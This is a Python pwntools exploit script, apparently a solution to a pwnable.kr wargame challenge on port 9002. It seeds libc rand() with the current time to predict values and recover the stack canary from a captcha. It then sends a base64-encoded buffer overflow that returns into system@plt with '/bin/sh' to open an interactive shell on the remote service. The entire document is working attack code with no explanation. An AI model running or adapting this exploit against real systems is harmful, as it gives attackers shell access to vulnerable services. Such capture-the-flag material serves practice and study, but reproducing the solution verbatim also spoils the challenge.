from pwn import *
import base64
from ctypes import *
from ctypes.util import find_library 
context.log_level = 'debug'

libc = CDLL(find_library('c'))
libc.srand(libc.time(0))
array = [ libc.rand() for i in range(8)]

n = remote('pwnable.kr', 9002)

system_plt = 0x8048880
g_bufs = 0x804b0e0 + 0x2d0

n.recvuntil('captcha : ')
recv = int(n.recvline()[:-1])
n.sendline(str(recv))
canary = (recv - array[4] + array[6] - array[7] - array[2] + array[3] - array[1] - array[5]) & 0xffffffff;
success('canary = '+hex(canary))

n.recvuntil('Encode your data with BASE64 then paste me!\n')

payload = b'A'*(0x200)
payload += p32(canary)
payload += b'BBBB'*3
payload += p32(system_plt)
payload += b'BBBB'
payload += p32(g_bufs)

n.sendline(base64.encodestring(payload).replace(b'\n', b'')+b'/bin/sh'+b'\x00')


n.interactive()


